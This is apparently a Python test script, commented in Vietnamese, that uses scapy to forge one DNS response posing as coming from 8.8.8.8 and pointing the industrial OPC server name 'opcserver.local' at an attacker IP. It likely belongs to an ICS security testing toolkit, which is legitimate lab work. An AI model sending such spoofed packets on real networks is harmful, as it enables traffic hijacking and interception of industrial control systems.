#!/usr/bin/env python3
"""
tests_ext/test_dns_spoof_ics.py
Test: Kiểm tra scapy có import được, gửi 1 DNS response giả.

Chạy (cần root):
  sudo python tests_ext/test_dns_spoof_ics.py --iface eth0
"""

import argparse


def run(iface, attacker_ip):
    print(f"\n{'='*50}")
    print(f"[TEST] DNS_SPOOF_ICS — Gửi 1 DNS response giả")
    print(f"       Interface: {iface}  Attacker IP: {attacker_ip}")
    print(f"{'='*50}\n")

    try:
        from scapy.all import DNS, DNSRR, DNSQR, IP, UDP, send

        fake_response = (
            IP(src="8.8.8.8", dst=attacker_ip) /
            UDP(sport=53, dport=12345) /
            DNS(
                id=1234,
                qr=1,
                an=DNSRR(rrname="opcserver.local.", rdata=attacker_ip)
            )
        )

        print(f"  [SEND] DNS response: opcserver.local -> {attacker_ip}")
        send(fake_response, verbose=True, iface=iface)

        print(f"\n  {'='*50}")
        print(f"  [RESULT] PASS - Packet đã gửi (kiểm tra Wireshark để xác nhận)")
        print(f"  {'='*50}\n")

    except ImportError:
        print(f"  [SKIP] scapy chưa cài: pip install scapy")
    except PermissionError:
        print(f"\n  {'='*50}")
        print(f"  [RESULT] FAIL - Cần quyền root. Chạy: sudo python ...")
        print(f"  {'='*50}\n")
    except Exception as e:
        print(f"\n  {'='*50}")
        print(f"  [RESULT] FAIL - {e}")
        print(f"  {'='*50}\n")


def main():
    p = argparse.ArgumentParser(description="Test DNS Spoof")
    p.add_argument("--iface", default="eth0")
    p.add_argument("--attacker-ip", default="192.168.1.100")
    args = p.parse_args()
    run(args.iface, args.attacker_ip)


if __name__ == "__main__":
    main()
